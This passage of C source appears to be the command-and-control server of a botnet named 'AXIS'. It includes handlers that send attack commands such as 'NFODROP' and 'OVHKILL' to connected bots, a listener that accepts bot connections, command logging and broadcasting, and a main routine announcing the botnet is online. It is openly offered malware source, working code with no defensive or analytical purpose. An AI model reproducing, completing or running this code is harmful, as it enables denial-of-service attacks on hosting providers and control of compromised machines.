        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! NFODROP")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mNFODROP\e[0m, Attack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
        if(strstr(buf, "! OVHKILL")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mOVHKILL\e[0m, Attack Has Been Sent.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }//Made By @i_am_unbekannt.
        if(strstr(buf, "! STOP")) 
        {
        sprintf(sentattacks, "\e[1;91m[ \e[0m➤ \e[1;91m] \e[1;91mSTOP\e[0m, Attack Has Been Stopped.\e[0m\r\n");
        if(send(datafd, sentattacks, strlen(sentattacks), MSG_NOSIGNAL) == -1) return;
        }
            trim(buf);
		char input [5000];
        sprintf(input, "\e[0m[\e[1;91mAXIS\e[0m]~: \e[0m");
		if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
            if(strlen(buf) == 0) continue;
            printf("\e[1;95m[\e[0mAXIS\e[1;95m]\e[0m User\e[1;95m:\e[0m %s \e[1;95m|\e[0m Command\e[1;95m:\e[0m %s\e[0m\n", accounts[find_line].username, buf);

			FILE *logfile;
            logfile = fopen("AXIS_Logs.log", "a");
			//Made By @i_am_unbekannt.
            fprintf(logfile, "[AXIS] User: %s | Command: %s\n", accounts[find_line].username, buf);
            fclose(logfile);
            broadcast(buf, datafd, accounts[find_line].username);
            memset(buf, 0, 2048);
        }

		end:
		managements[datafd].connected = 0;
		close(datafd);
		OperatorsConnected--;
}
void *BotListener(int port) {
	int sockfd, newsockfd;
	socklen_t clilen;
    struct sockaddr_in serv_addr, cli_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) perror("ERROR opening socket");
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = INADDR_ANY;
    serv_addr.sin_port = htons(port);
    if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
    listen(sockfd,5);
    clilen = sizeof(cli_addr);
    while(1) {
		newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
        if (newsockfd < 0) perror("ERROR on accept");
        pthread_t thread;
        pthread_create( &thread, NULL, &BotWorker, (void *)newsockfd);
}}
int main (int argc, char *argv[], void *sock) {
	    printf("\e[1;91m[ \e[0mINFO \e[1;91m]\e[0m Coded by \e[1;91m@i_am_unbekannt\r\n");
	    printf("\r\n");
	    printf("\e[1;91m[ \e[0mINFO \e[1;91m]\e[0m Starting \e[1;91mAXIS\e[0m Botnet\e[1;91m...\e[0m\r\n");
	    printf("\e[1;91m[ \e[0mINFO \e[1;91m] AXIS\e[0m Botnet Is Online\e[1;91m...\e[0m\r\n");
	    printf("\e[0m\r\n");
	    printf("\e[0m---------------\e[1;91mLOG\e[0m---------------\r\n");
	    printf("\e[0m\r\n");
        signal(SIGPIPE, SIG_IGN);//Made By @i_am_unbekannt.
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4) {
			fprintf (stderr, "\e[1;91mIncorrect Usage!\e[0m\n");
			exit (EXIT_FAILURE);
        }

		port = atoi(argv[3]);
		
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]);
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD);
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN);
        if (s == -1) {
			perror ("listen");
			abort ();
        }
        epollFD = epoll_create1 (0);
        if (epollFD == -1) {
			perror ("epoll_create");
			abort ();
        }//Made By @i_am_unbekannt.
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1) {
			perror ("epoll_ctl");
			abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--) {
			pthread_create( &thread[threads + 1], NULL, &BotEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &BotListener, port);
        while(1) {
			broadcast("PING", -1, "AXIS");
			sleep(60);//Made By @i_am_unbekannt.
        }
        close (listenFD);
        return EXIT_SUCCESS;
}
